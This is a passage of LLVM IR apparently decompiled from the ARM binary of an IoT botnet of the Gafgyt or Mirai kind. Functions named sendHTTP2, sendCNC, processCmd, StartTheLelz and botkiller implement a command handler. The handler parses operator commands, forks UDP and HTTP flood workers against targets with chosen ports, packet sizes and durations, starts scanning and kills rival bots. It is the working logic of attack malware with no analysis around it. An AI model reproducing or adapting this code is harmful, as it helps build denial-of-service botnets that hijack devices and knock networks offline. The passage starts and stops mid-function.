  %v1_10574 = add nuw nsw i32 %storemerge144, 1
  %v5_10588 = icmp slt i32 %v1_10574, %arg6
  br i1 %v5_10588, label %dec_label_pc_104e0, label %dec_label_pc_1058c

dec_label_pc_1058c:                               ; preds = %dec_label_pc_10570, %entry
  %v1_10594.lcssa = phi i32 [ %v8_104d0, %entry ], [ %v1_105943, %dec_label_pc_10570 ]
  ret i32 %v1_10594.lcssa

; uselistorder directives
  uselistorder i32 %v1_10574, { 1, 0 }
  uselistorder i32 %v4_10510, { 1, 0, 2 }
  uselistorder i32 %v2_104b4, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8*** %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_10570, { 1, 0 }
  uselistorder label %dec_label_pc_10550, { 1, 0, 2 }
  uselistorder label %dec_label_pc_104e0, { 1, 0 }
}

define i32 @sendHTTP2(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-572 = alloca i32, align 4
  %stack_var_-44 = alloca i8**, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_105b0 = load i32, i32* @fp, align 4
  store i32 %v3_105b0, i32* %stack_var_-16, align 4
  %v10_105b0 = load i32, i32* @lr, align 4
  store i32 67000, i32* %stack_var_-4, align 4
  %v2_105b4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_105b4, i32* @fp, align 4
  %v21_105e8 = ptrtoint i8*** %stack_var_-44 to i32
  store i32 %v21_105e8, i32* @lr, align 4
  store i8** bitcast ([32 x i8]* @global_var_1ff44.687 to i8**), i8*** %stack_var_-44, align 4
  %v2_105f8 = call i32 @__GI_time(i32* null)
  %v3_10600 = load i32, i32* %stack_var_0, align 4
  %v2_10604 = add i32 %v3_10600, %v2_105f8
  %v2_10674 = ptrtoint i32* %stack_var_-572 to i32
  %tmp30 = bitcast i32* %stack_var_-572 to i8*
  %v5_1075438 = icmp sgt i32 %arg6, 0
  br i1 %v5_1075438, label %dec_label_pc_10620.lr.ph, label %dec_label_pc_10758

dec_label_pc_10620.lr.ph:                         ; preds = %entry
  %v13_105b0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_10668 = add i32 %v13_105b0, -44
  br label %dec_label_pc_10620

dec_label_pc_10620:                               ; preds = %dec_label_pc_10620.lr.ph, %dec_label_pc_1073c
  %storemerge139 = phi i32 [ 0, %dec_label_pc_10620.lr.ph ], [ %v1_10740, %dec_label_pc_1073c ]
  %v0_10620 = call i32 @rand()
  %v2_10638 = srem i32 %v0_10620, 36
  %v3_10660 = mul nsw i32 %v2_10638, 4
  %v2_1066c = add i32 %v2_10668, %v3_10660
  %v1_10670 = inttoptr i32 %v2_1066c to i32*
  %v2_10670 = load i32, i32* %v1_10670, align 4
  store i32 %v2_10674, i32* @r0, align 4
  %v8_10694 = call i32 @sprintf(i32 %v2_10674, i32 ptrtoint ([64 x i8]* @global_var_2004c.718 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v2_10670, i32 %v2_10638)
  store i32 %v8_10694, i32* @r0, align 4
  %v0_10698 = call i32 @__libc_fork()
  %v2_106a0 = icmp eq i32 %v0_10698, 0
  br i1 %v2_106a0, label %dec_label_pc_1073c, label %dec_label_pc_1071c

dec_label_pc_106ac:                               ; preds = %dec_label_pc_1071c
  %v4_106c4 = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v2_106d4 = icmp eq i32 %v4_106c4, 0
  br i1 %v2_106d4, label %dec_label_pc_1071c, label %dec_label_pc_106dc

dec_label_pc_106dc:                               ; preds = %dec_label_pc_106ac
  %v3_106e4 = call i32 @strlen(i8* %tmp30)
  %v2_106f8 = call i32 @__GI_write(i32 %v4_106c4, i32 %v2_10674)
  %v1_10710 = call i32 @__GI_read(i32 %v4_106c4)
  %v1_10718 = call i32 @__GI_close(i32 %v4_106c4)
  br label %dec_label_pc_1071c

dec_label_pc_1071c:                               ; preds = %dec_label_pc_106ac, %dec_label_pc_106dc, %dec_label_pc_10620
  %v2_10720 = call i32 @__GI_time(i32* null)
  %v5_10730 = icmp slt i32 %v2_10720, %v2_10604
  br i1 %v5_10730, label %dec_label_pc_106ac, label %dec_label_pc_10734

dec_label_pc_10734:                               ; preds = %dec_label_pc_1071c
  %v1_10738 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_1073c

dec_label_pc_1073c:                               ; preds = %dec_label_pc_10620, %dec_label_pc_10734
  %v1_107603 = phi i32 [ 0, %dec_label_pc_10620 ], [ %v1_10738, %dec_label_pc_10734 ]
  %v1_10740 = add nuw nsw i32 %storemerge139, 1
  %v5_10754 = icmp slt i32 %v1_10740, %arg6
  br i1 %v5_10754, label %dec_label_pc_10620, label %dec_label_pc_10758

dec_label_pc_10758:                               ; preds = %dec_label_pc_1073c, %entry
  %v1_10760.lcssa = phi i32 [ %v2_105f8, %entry ], [ %v1_107603, %dec_label_pc_1073c ]
  %v2_1075c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1075c, i32* @fp, align 4
  store i32 %v10_105b0, i32* @lr, align 4
  ret i32 %v1_10760.lcssa

; uselistorder directives
  uselistorder i32 %v2_10674, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8*** %stack_var_-44, { 1, 0 }
  uselistorder i32 (i32, i16)* @socket_connect, { 1, 0 }
  uselistorder i32 ()* @rand, { 5, 9, 8, 7, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1073c, { 1, 0 }
  uselistorder label %dec_label_pc_1071c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10620, { 1, 0 }
}

define i32 @sendCNC(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10790 = call i32 @__GI_time(i32* null)
  %v2_1079c = add i32 %v2_10790, %arg3
  store i32 %arg1, i32* @r0, align 4
  %v1_107ac = call i32 @inet_addr(i32 %arg1)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_107c8 = urem i32 %arg2, 65536
  %v1_107d0 = call i32 @__GI_htons(i32 %v3_107c8)
  %v2_107f8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1081c

dec_label_pc_107e0:                               ; preds = %dec_label_pc_1081c
  %v3_107ec = call i32 @socket(i32 2, i32 1, i32 0)
  %v3_10808 = call i32 @__libc_connect(i32 %v3_107ec, i32 %v2_107f8, i32 16)
  %v1_10810 = call i32 @sleep(i32 1)
  %v1_10818 = call i32 @__GI_close(i32 %v3_107ec)
  br label %dec_label_pc_1081c

dec_label_pc_1081c:                               ; preds = %entry, %dec_label_pc_107e0
  %v2_10820 = call i32 @__GI_time(i32* null)
  %v5_10830 = icmp slt i32 %v2_10820, %v2_1079c
  br i1 %v5_10830, label %dec_label_pc_107e0, label %dec_label_pc_10834

dec_label_pc_10834:                               ; preds = %dec_label_pc_1081c
  ret i32 %v2_10820

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1081c, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_10840 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_10840, i32* @ip, align 4
  %v3_10844 = load i32, i32* @r4, align 4
  %v6_10844 = load i32, i32* @r5, align 4
  %v9_10844 = load i32, i32* @r6, align 4
  %v12_10844 = load i32, i32* @r7, align 4
  %v15_10844 = load i32, i32* @r8, align 4
  %v18_10844 = load i32, i32* @fp, align 4
  store i32 67660, i32* %stack_var_-4, align 4
  %v2_10848 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10848, i32* @fp, align 4
  %v2_1085c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1ee88.52 to i32), i32* @r1, align 4
  %v3_10868 = inttoptr i32 %v2_1085c to i8*
  %v4_10868 = call i32 @__GI_strcoll(i8* %v3_10868, i32 ptrtoint ([5 x i8]* @global_var_1ee88.52 to i32))
  %v2_10870 = icmp eq i32 %v4_10868, 0
  br i1 %v2_10870, label %dec_label_pc_10878, label %dec_label_pc_10890

dec_label_pc_10878:                               ; preds = %entry
  %v2_1087c = load i32, i32* @global_var_2a530.50, align 4
  %v3_10888 = call i32 @sockprintf(i32 %v2_1087c, i32 ptrtoint ([6 x i8]* @global_var_2008c.722 to i32))
  br label %dec_label_pc_11940

dec_label_pc_10890:                               ; preds = %entry
  %v2_10894 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_20094.724 to i32), i32* @r1, align 4
  %v3_108a0 = inttoptr i32 %v2_10894 to i8*
  %v4_108a0 = call i32 @__GI_strcoll(i8* %v3_108a0, i32 ptrtoint ([6 x i8]* @global_var_20094.724 to i32))
  %v2_108a8 = icmp eq i32 %v4_108a0, 0
  br i1 %v2_108a8, label %dec_label_pc_108b0, label %dec_label_pc_108d4

dec_label_pc_108b0:                               ; preds = %dec_label_pc_10890
  %v2_108b4 = load i32, i32* @global_var_2a530.50, align 4
  store i32 %v2_108b4, i32* @r4, align 4
  %v0_108b8 = call i32 @getdtablesize()
  %v0_108c0 = load i32, i32* @r4, align 4
  store i32 %v0_108b8, i32* @r2, align 4
  %v3_108cc = call i32 @sockprintf(i32 %v0_108c0, i32 ptrtoint ([3 x i8]* @global_var_2009c.726 to i32))
  br label %dec_label_pc_11940

dec_label_pc_108d4:                               ; preds = %dec_label_pc_10890
  %v2_108d8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_200a0.728 to i32), i32* @r1, align 4
  %v3_108e4 = inttoptr i32 %v2_108d8 to i8*
  %v4_108e4 = call i32 @__GI_strcoll(i8* %v3_108e4, i32 ptrtoint ([8 x i8]* @global_var_200a0.728 to i32))
  %v2_108ec = icmp eq i32 %v4_108e4, 0
  br i1 %v2_108ec, label %dec_label_pc_108f4, label %dec_label_pc_10a10

dec_label_pc_108f4:                               ; preds = %dec_label_pc_108d4
  %v1_108f8 = add i32 %tmp, 4
  %v1_108fc = inttoptr i32 %v1_108f8 to i32*
  %v2_108fc = load i32, i32* %v1_108fc, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_200a8.730 to i32), i32* @r1, align 4
  %v3_10908 = inttoptr i32 %v2_108fc to i8*
  %v4_10908 = call i32 @__GI_strcoll(i8* %v3_10908, i32 ptrtoint ([4 x i8]* @global_var_200a8.730 to i32))
  %v2_10910 = icmp eq i32 %v4_10908, 0
  br i1 %v2_10910, label %dec_label_pc_10918, label %dec_label_pc_1095c

dec_label_pc_10918:                               ; preds = %dec_label_pc_108f4
  %v2_1091c = load i32, i32* @global_var_30794.732, align 4
  %v2_10920 = icmp eq i32 %v2_1091c, 0
  br i1 %v2_10920, label %dec_label_pc_11940, label %dec_label_pc_10928

dec_label_pc_10928:                               ; preds = %dec_label_pc_10918
  %v2_10938 = call i32 @kill(i32 %v2_1091c, i32 9)
  %v2_10940 = load i32, i32* @global_var_2a530.50, align 4
  %v3_1094c = call i32 @sockprintf(i32 %v2_10940, i32 ptrtoint ([17 x i8]* @global_var_200ac.734 to i32))
  store i32 0, i32* @global_var_30794.732, align 4
  br label %dec_label_pc_1095c

dec_label_pc_1095c:                               ; preds = %dec_label_pc_108f4, %dec_label_pc_10928
  %v2_10964 = load i32, i32* %v1_108fc, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_200c0.736 to i32), i32* @r1, align 4
  %v3_10970 = inttoptr i32 %v2_10964 to i8*
  %v4_10970 = call i32 @__GI_strcoll(i8* %v3_10970, i32 ptrtoint ([3 x i8]* @global_var_200c0.736 to i32))
  store i32 %v4_10970, i32* @r0, align 4
  %v2_10978 = icmp eq i32 %v4_10970, 0
  br i1 %v2_10978, label %dec_label_pc_10980, label %dec_label_pc_10a10

dec_label_pc_10980:                               ; preds = %dec_label_pc_1095c
  %v2_10984 = load i32, i32* @global_var_30794.732, align 4
  %v2_10988 = icmp eq i32 %v2_10984, 0
  br i1 %v2_10988, label %dec_label_pc_10990, label %dec_label_pc_11940

dec_label_pc_10990:                               ; preds = %dec_label_pc_10980
  %v0_10990 = call i32 @__libc_fork()
  %v2_109b0 = icmp eq i32 %v0_10990, 0
  br i1 %v2_109b0, label %dec_label_pc_109d4, label %dec_label_pc_109b8

dec_label_pc_109b8:                               ; preds = %dec_label_pc_10990
  store i32 %v0_10990, i32* @global_var_30794.732, align 4
  br label %dec_label_pc_11940

dec_label_pc_109d4:                               ; preds = %dec_label_pc_10990
  %v2_109d8 = load i32, i32* @global_var_2a530.50, align 4
  store i32 %v2_109d8, i32* @r4, align 4
  %v2_109e0 = load i32, i32* @global_var_3078c.483, align 4
  store i32 %v2_109e0, i32* @r0, align 4
  %v1_109e4 = call i32 @__GI_inet_ntoa(i32 %v2_109e0)
  %v0_109ec = load i32, i32* @r4, align 4
  store i32 %v1_109e4, i32* @r2, align 4
  %v3_109f8 = call i32 @sockprintf(i32 %v0_109ec, i32 ptrtoint ([26 x i8]* @global_var_200c4.739 to i32))
  %v2_10a04 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_10a0c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10a10

dec_label_pc_10a10:                               ; preds = %dec_label_pc_1095c, %dec_label_pc_108d4, %dec_label_pc_109d4
  %v2_10a14 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_200e0.741 to i32), i32* @r1, align 4
  %v3_10a20 = inttoptr i32 %v2_10a14 to i8*
  %v4_10a20 = call i32 @__GI_strcoll(i8* %v3_10a20, i32 ptrtoint ([8 x i8]* @global_var_200e0.741 to i32))
  store i32 %v4_10a20, i32* @r0, align 4
  %v2_10a28 = icmp eq i32 %v4_10a20, 0
  br i1 %v2_10a28, label %dec_label_pc_10a30, label %dec_label_pc_10a74

dec_label_pc_10a30:                               ; preds = %dec_label_pc_10a10
  %v0_10a30 = call i32 @listFork()
  %v2_10a38 = icmp eq i32 %v0_10a30, 0
  br i1 %v2_10a38, label %dec_label_pc_10a40, label %dec_label_pc_10a74

dec_label_pc_10a40:                               ; preds = %dec_label_pc_10a30
  %v2_10a44 = load i32, i32* @global_var_2a530.50, align 4
  store i32 %v2_10a44, i32* @r4, align 4
  %v2_10a4c = load i32, i32* @global_var_3078c.483, align 4
  store i32 %v2_10a4c, i32* @r0, align 4
  %v1_10a50 = call i32 @__GI_inet_ntoa(i32 %v2_10a4c)
  %v0_10a58 = load i32, i32* @r4, align 4
  store i32 %v1_10a50, i32* @r2, align 4
  %v3_10a64 = call i32 @sockprintf(i32 %v0_10a58, i32 ptrtoint ([29 x i8]* @global_var_200e8.743 to i32))
  %v1_10a68 = call i32 @botkiller(i32 %v3_10a64)
  %v1_10a70 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10a74

dec_label_pc_10a74:                               ; preds = %dec_label_pc_10a30, %dec_label_pc_10a10, %dec_label_pc_10a40
  %v2_10a78 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_20108.745 to i32), i32* @r1, align 4
  %v3_10a84 = inttoptr i32 %v2_10a78 to i8*
  %v4_10a84 = call i32 @__GI_strcoll(i8* %v3_10a84, i32 ptrtoint ([12 x i8]* @global_var_20108.745 to i32))
  %v2_10a8c = icmp eq i32 %v4_10a84, 0
  br i1 %v2_10a8c, label %dec_label_pc_10a94, label %dec_label_pc_10ac0

dec_label_pc_10a94:                               ; preds = %dec_label_pc_10a74
  %v2_10a98 = load i32, i32* @global_var_2a530.50, align 4
  store i32 %v2_10a98, i32* @r4, align 4
  %v2_10aa0 = load i32, i32* @global_var_3078c.483, align 4
  store i32 %v2_10aa0, i32* @r0, align 4
  %v1_10aa4 = call i32 @__GI_inet_ntoa(i32 %v2_10aa0)
  %v0_10aac = load i32, i32* @r4, align 4
  store i32 %v1_10aa4, i32* @r2, align 4
  %v3_10ab8 = call i32 @sockprintf(i32 %v0_10aac, i32 ptrtoint ([17 x i8]* @global_var_20114.747 to i32))
  br label %dec_label_pc_11940

dec_label_pc_10ac0:                               ; preds = %dec_label_pc_10a74
  %v2_10ac4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_20128.749 to i32), i32* @r1, align 4
  %v3_10ad0 = inttoptr i32 %v2_10ac4 to i8*
  %v4_10ad0 = call i32 @__GI_strcoll(i8* %v3_10ad0, i32 ptrtoint ([4 x i8]* @global_var_20128.749 to i32))
  %v2_10ad8 = icmp eq i32 %v4_10ad0, 0
  br i1 %v2_10ad8, label %dec_label_pc_10ae0, label %dec_label_pc_10e40

dec_label_pc_10ae0:                               ; preds = %dec_label_pc_10ac0
  %v7_10ae8 = icmp slt i32 %arg1, 6
  br i1 %v7_10ae8, label %dec_label_pc_10c00, label %dec_label_pc_10aec

dec_label_pc_10aec:                               ; preds = %dec_label_pc_10ae0
  %v1_10af0 = add i32 %tmp, 12
  %v1_10af4 = inttoptr i32 %v1_10af0 to i32*
  %v2_10af4 = load i32, i32* %v1_10af4, align 4
  store i32 %v2_10af4, i32* @r0, align 4
  %v1_10afc = call i32 @atol(i32 %v2_10af4)
  %v7_10b04 = icmp eq i32 %v1_10afc, -1
  br i1 %v7_10b04, label %dec_label_pc_10c00, label %dec_label_pc_10b0c

dec_label_pc_10b0c:                               ; preds = %dec_label_pc_10aec
  %v1_10b10 = add i32 %tmp, 8
  %v1_10b14 = inttoptr i32 %v1_10b10 to i32*
  %v2_10b14 = load i32, i32* %v1_10b14, align 4
  store i32 %v2_10b14, i32* @r0, align 4
  %v1_10b1c = call i32 @atol(i32 %v2_10b14)
  %v7_10b24 = icmp eq i32 %v1_10b1c, -1
  br i1 %v7_10b24, label %dec_label_pc_10c00, label %dec_label_pc_10b2c

dec_label_pc_10b2c:                               ; preds = %dec_label_pc_10b0c
  %v1_10b30 = add i32 %tmp, 16
  %v1_10b34 = inttoptr i32 %v1_10b30 to i32*
  %v2_10b34 = load i32, i32* %v1_10b34, align 4
  store i32 %v2_10b34, i32* @r0, align 4
  %v1_10b3c = call i32 @atol(i32 %v2_10b34)
  %v7_10b44 = icmp eq i32 %v1_10b3c, -1
  br i1 %v7_10b44, label %dec_label_pc_10c00, label %dec_label_pc_10b4c

dec_label_pc_10b4c:                               ; preds = %dec_label_pc_10b2c
  %v1_10b50 = add i32 %tmp, 20
  %v1_10b54 = inttoptr i32 %v1_10b50 to i32*
  %v2_10b54 = load i32, i32* %v1_10b54, align 4
  store i32 %v2_10b54, i32* @r0, align 4
  %v1_10b5c = call i32 @atol(i32 %v2_10b54)
  %v7_10b64 = icmp eq i32 %v1_10b5c, -1
  br i1 %v7_10b64, label %dec_label_pc_10c00, label %dec_label_pc_10b6c

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10b4c
  %v2_10b74 = load i32, i32* %v1_10b54, align 4
  store i32 %v2_10b74, i32* @r0, align 4
  %v1_10b7c = call i32 @atol(i32 %v2_10b74)
  %v8_10b88 = icmp sgt i32 %v1_10b7c, 65536
  br i1 %v8_10b88, label %dec_label_pc_10c00, label %dec_label_pc_10b8c

dec_label_pc_10b8c:                               ; preds = %dec_label_pc_10b6c
  %v2_10b94 = load i32, i32* %v1_10b54, align 4
  store i32 %v2_10b94, i32* @r0, align 4
  %v1_10b9c = call i32 @atol(i32 %v2_10b94)
  store i32 %v1_10b9c, i32* @r2, align 4
  %v8_10bb0 = icmp sgt i32 %v1_10b9c, 65500
  br i1 %v8_10bb0, label %dec_label_pc_10c00, label %dec_label_pc_10bb4

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10b8c
  %v2_10bbc = load i32, i32* %v1_10b34, align 4
  store i32 %v2_10bbc, i32* @r0, align 4
  %v1_10bc4 = call i32 @atol(i32 %v2_10bbc)
  %v8_10bd0 = icmp sgt i32 %v1_10bc4, 32
  br i1 %v8_10bd0, label %dec_label_pc_10c00, label %dec_label_pc_10bd4

dec_label_pc_10bd4:                               ; preds = %dec_label_pc_10bb4
  %v7_10bd8 = icmp eq i32 %arg1, 7
  br i1 %v7_10bd8, label %dec_label_pc_10be0, label %dec_label_pc_10c18

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10bd4
  %v1_10be4 = add i32 %tmp, 24
  %v1_10be8 = inttoptr i32 %v1_10be4 to i32*
  %v2_10be8 = load i32, i32* %v1_10be8, align 4
  store i32 %v2_10be8, i32* @r0, align 4
  %v1_10bf0 = call i32 @atol(i32 %v2_10be8)
  %v5_10bfc = icmp sgt i32 %v1_10bf0, 0
  br i1 %v5_10bfc, label %dec_label_pc_10c18, label %dec_label_pc_10c00

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10be0, %dec_label_pc_10bb4, %dec_label_pc_10b8c, %dec_label_pc_10b6c, %dec_label_pc_10b4c, %dec_label_pc_10b2c, %dec_label_pc_10b0c, %dec_label_pc_10aec, %dec_label_pc_10ae0
  %v2_10c04 = load i32, i32* @global_var_2a530.50, align 4
  %v3_10c10 = call i32 @sockprintf(i32 %v2_10c04, i32 ptrtoint ([113 x i8]* @global_var_2012c.751 to i32))
  br label %dec_label_pc_11940

dec_label_pc_10c18:                               ; preds = %dec_label_pc_10bd4, %dec_label_pc_10be0
  %v1_10c1c = add i32 %tmp, 4
  %v1_10c20 = inttoptr i32 %v1_10c1c to i32*
  %v2_10c20 = load i32, i32* %v1_10c20, align 4
  %v2_10c30 = load i32, i32* %v1_10b14, align 4
  store i32 %v2_10c30, i32* @r0, align 4
  %v1_10c38 = call i32 @atol(i32 %v2_10c30)
  %v2_10c4c = load i32, i32* %v1_10af4, align 4
  store i32 %v2_10c4c, i32* @r0, align 4
  %v1_10c54 = call i32 @atol(i32 %v2_10c4c)
  %v2_10c68 = load i32, i32* %v1_10b34, align 4
  store i32 %v2_10c68, i32* @r0, align 4
  %v1_10c70 = call i32 @atol(i32 %v2_10c68)
  %v2_10c84 = load i32, i32* %v1_10b54, align 4
  store i32 %v2_10c84, i32* @r0, align 4
  %v1_10c8c = call i32 @atol(i32 %v2_10c84)
  %v7_10ca0 = icmp slt i32 %arg1, 7
  br i1 %v7_10ca0, label %dec_label_pc_10cc0, label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c18
  %v1_10ca8 = add i32 %tmp, 24
  %v1_10cac = inttoptr i32 %v1_10ca8 to i32*
  %v2_10cac = load i32, i32* %v1_10cac, align 4
  store i32 %v2_10cac, i32* @r0, align 4
  %v1_10cb4 = call i32 @atol(i32 %v2_10cac)
  br label %dec_label_pc_10cc8

dec_label_pc_10cc0:                               ; preds = %dec_label_pc_10c18
  br label %dec_label_pc_10cc8

dec_label_pc_10cc8:                               ; preds = %dec_label_pc_10ca4, %dec_label_pc_10cc0
  %storemerge10 = phi i32 [ 1000, %dec_label_pc_10cc0 ], [ %v1_10cb4, %dec_label_pc_10ca4 ]
  %v7_10cd8 = icmp slt i32 %arg1, 8
  br i1 %v7_10cd8, label %dec_label_pc_10cf8, label %dec_label_pc_10cdc

dec_label_pc_10cdc:                               ; preds = %dec_label_pc_10cc8
  %v1_10ce0 = add i32 %tmp, 28
  %v1_10ce4 = inttoptr i32 %v1_10ce0 to i32*
  %v2_10ce4 = load i32, i32* %v1_10ce4, align 4
  store i32 %v2_10ce4, i32* @r0, align 4
  %v1_10cec = call i32 @atol(i32 %v2_10ce4)
  br label %dec_label_pc_10d0c

dec_label_pc_10cf8:                               ; preds = %dec_label_pc_10cc8
  br label %dec_label_pc_10d0c

dec_label_pc_10d0c:                               ; preds = %dec_label_pc_10cdc, %dec_label_pc_10cf8
  %storemerge9 = phi i32 [ 1000000, %dec_label_pc_10cf8 ], [ %v1_10cec, %dec_label_pc_10cdc ]
  %v7_10d1c = icmp slt i32 %arg1, 9
  br i1 %v7_10d1c, label %dec_label_pc_10d3c, label %dec_label_pc_10d20

dec_label_pc_10d20:                               ; preds = %dec_label_pc_10d0c
  %v1_10d24 = add i32 %tmp, 32
  %v1_10d28 = inttoptr i32 %v1_10d24 to i32*
  %v2_10d28 = load i32, i32* %v1_10d28, align 4
  store i32 %v2_10d28, i32* @r0, align 4
  %v1_10d30 = call i32 @atol(i32 %v2_10d28)
  br label %dec_label_pc_10d44

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10d0c
  br label %dec_label_pc_10d44

dec_label_pc_10d44:                               ; preds = %dec_label_pc_10d20, %dec_label_pc_10d3c
  %storemerge8 = phi i32 [ 0, %dec_label_pc_10d3c ], [ %v1_10d30, %dec_label_pc_10d20 ]
  store i32 %v2_10c20, i32* @r0, align 4
  %v2_10d58 = call i32 @__GI_strchr(i32 %v2_10c20, i32 44)
  store i32 %v2_10d58, i32* @r0, align 4
  %v2_10d60 = icmp eq i32 %v2_10d58, 0
  br i1 %v2_10d60, label %dec_label_pc_10df4, label %dec_label_pc_10d68

dec_label_pc_10d68:                               ; preds = %dec_label_pc_10d44
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_10d74 = call i32 @__GI_strtok(i32 %v2_10c20, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  store i32 %v2_10d74, i32* @r0, align 4
  %v2_10de834 = icmp eq i32 %v2_10d74, 0
  br i1 %v2_10de834, label %dec_label_pc_11940, label %dec_label_pc_10d84

dec_label_pc_10d84:                               ; preds = %dec_label_pc_10d68, %dec_label_pc_10dd0
  %storemerge2135 = phi i32 [ %v2_10dd8, %dec_label_pc_10dd0 ], [ %v2_10d74, %dec_label_pc_10d68 ]
  %v0_10d84 = call i32 @listFork()
  %v2_10d8c = icmp eq i32 %v0_10d84, 0
  br i1 %v2_10d8c, label %dec_label_pc_10d94, label %dec_label_pc_10dd0

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10d84
  %v8_10dc4 = call i32 @sendUDP(i32 %storemerge2135, i32 %v1_10c38, i32 %v1_10c54, i32 %v1_10c70, i32 %v1_10c8c, i32 %storemerge10, i32 %storemerge9, i32 %storemerge8)
  %v1_10dcc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10dd0

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10d84, %dec_label_pc_10d94
  store i32 ptrtoint (i32* @global_var_1fd3c.572 to i32), i32* @r1, align 4
  %v2_10dd8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1fd3c.572 to i32))
  store i32 %v2_10dd8, i32* @r0, align 4
  %v2_10de8 = icmp eq i32 %v2_10dd8, 0
  br i1 %v2_10de8, label %dec_label_pc_11940, label %dec_label_pc_10d84

dec_label_pc_10df4:                               ; preds = %dec_label_pc_10d44
  %v0_10df4 = call i32 @listFork()
  %v2_10dfc = icmp eq i32 %v0_10df4, 0
  br i1 %v2_10dfc, label %dec_label_pc_10e04, label %dec_label_pc_11940

dec_label_pc_10e04:                               ; preds = %dec_label_pc_10df4
  %v8_10e34 = call i32 @sendUDP(i32 %v2_10c20, i32 %v1_10c38, i32 %v1_10c54, i32 %v1_10c70, i32 %v1_10c8c, i32 %storemerge10, i32 %storemerge9, i32 %storemerge8)
  %v1_10e3c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10e40

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10ac0, %dec_label_pc_10e04
  %v2_10e44 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_201a0.754 to i32), i32* @r1, align 4
  %v3_10e50 = inttoptr i32 %v2_10e44 to i8*
  %v4_10e50 = call i32 @__GI_strcoll(i8* %v3_10e50, i32 ptrtoint ([4 x i8]* @global_var_201a0.754 to i32))
  %v2_10e58 = icmp eq i32 %v4_10e50, 0
  br i1 %v2_10e58, label %dec_label_pc_10e60, label %dec_label_pc_11124

dec_label_pc_10e60:                               ; preds = %dec_label_pc_10e40
  %v7_10e68 = icmp slt i32 %arg1, 6
  br i1 %v7_10e68, label %dec_label_pc_10f44, label %dec_label_pc_10e6c

dec_label_pc_10e6c:                               ; preds = %dec_label_pc_10e60
  %v1_10e70 = add i32 %tmp, 12
  %v1_10e74 = inttoptr i32 %v1_10e70 to i32*
  %v2_10e74 = load i32, i32* %v1_10e74, align 4
  store i32 %v2_10e74, i32* @r0, align 4
  %v1_10e7c = call i32 @atol(i32 %v2_10e74)
  %v7_10e84 = icmp eq i32 %v1_10e7c, -1
  br i1 %v7_10e84, label %dec_label_pc_10f44, label %dec_label_pc_10e8c

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10e6c
  %v1_10e90 = add i32 %tmp, 8
  %v1_10e94 = inttoptr i32 %v1_10e90 to i32*
  %v2_10e94 = load i32, i32* %v1_10e94, align 4
  store i32 %v2_10e94, i32* @r0, align 4
  %v1_10e9c = call i32 @atol(i32 %v2_10e94)
  %v7_10ea4 = icmp eq i32 %v1_10e9c, -1
  br i1 %v7_10ea4, label %dec_label_pc_10f44, label %dec_label_pc_10eac

dec_label_pc_10eac:                               ; preds = %dec_label_pc_10e8c
  %v1_10eb0 = add i32 %tmp, 16
